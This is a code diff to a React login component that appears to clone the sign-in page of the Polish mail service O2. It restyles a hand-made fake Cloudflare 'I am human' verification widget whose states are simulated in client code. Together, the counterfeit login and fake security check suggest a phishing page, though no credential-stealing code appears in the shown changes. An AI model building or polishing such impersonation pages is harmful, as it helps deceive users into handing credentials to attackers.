@@ -1,7 +1,8 @@
+
 "use client"
 
 import { useState, useEffect } from "react"
-import { ChevronLeft, Loader2, Facebook, Apple, CheckCircle2 } from "lucide-react"
+import { ChevronLeft, Loader2, Facebook, Apple, Check } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import Image from "next/image"
@@ -139,27 +140,27 @@ export function O2Login() {
               </div>
             </div>
 
-            {/* Cloudflare Widget Dark */}
+            {/* Cloudflare Widget Dark - Enlarged */}
             <div 
-              className={`bg-[#313131] border border-transparent p-3 min-h-[70px] rounded-sm flex items-center justify-between transition-all duration-300 ${cfStatus === 'ready' ? 'cursor-pointer hover:bg-[#3a3a3a]' : 'cursor-default'}`}
+              className={`bg-[#313131] border border-transparent p-4 min-h-[80px] rounded-sm flex items-center justify-between transition-all duration-300 ${cfStatus === 'ready' ? 'cursor-pointer hover:bg-[#3a3a3a]' : 'cursor-default'}`}
               onClick={handleCloudflareClick}
             >
-              <div className="flex items-center gap-3">
+              <div className="flex items-center gap-4">
                 <div className="w-8 h-8 flex items-center justify-center relative">
                   {(cfStatus === 'initial' || cfStatus === 'verifying') && (
-                    <Loader2 className="w-6 h-6 text-white animate-spin" />
+                    <Loader2 className="w-7 h-7 text-white animate-spin" />
                   )}
                   {cfStatus === 'ready' && (
-                    <div className="w-5 h-5 border-2 border-gray-500 bg-transparent rounded-sm" />
+                    <div className="w-6 h-6 border-2 border-gray-500 bg-transparent rounded-sm" />
                   )}
                   {cfStatus === 'verified' && (
-                    <div className="bg-[#22c55e] rounded-full p-0.5 animate-in zoom-in duration-300">
-                      <CheckCircle2 className="w-6 h-6 text-white fill-[#22c55e]" />
+                    <div className="bg-[#22c55e] rounded-full p-1 animate-in zoom-in duration-300 flex items-center justify-center">
+                      <Check className="w-5 h-5 text-white" strokeWidth={4} />
                     </div>
                   )}
                 </div>
                 <div className="flex flex-col">
-                  <span className="text-[11px] font-semibold text-white leading-tight">
+                  <span className="text-[10.5px] font-semibold text-white leading-tight">
                     {(cfStatus === 'initial' || cfStatus === 'verifying') && 'Weryfikuję...'}
                     {cfStatus === 'ready' && 'Jestem człowiekiem'}
                     {cfStatus === 'verified' && 'Powodzenie!'}
